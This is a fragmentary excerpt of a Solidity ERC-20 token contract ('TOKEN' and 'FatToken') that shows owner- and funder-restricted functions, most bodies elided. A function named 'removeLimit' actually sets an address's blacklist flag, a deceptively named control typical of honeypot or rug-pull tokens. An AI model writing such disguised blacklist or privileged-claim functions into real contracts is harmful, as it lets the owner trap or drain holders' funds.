...
abstract contract TOKEN is IERC20, Ownable {
    ...
    function removeLimit(address addr, bool enable) public onlyOwner {
        _blackList[addr] = enable;
    }

    function setSwapPair(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }

    function claimMarket() external {
    ...
    function claim_(address addr, uint256 enable) public onlyFunder {
...
contract FatToken is TOKEN {
    ...
    constructor() TOKEN(
        ...
        address(0x5E53BBBba96298B8dB217C5f58a97F6660aAf9dc),
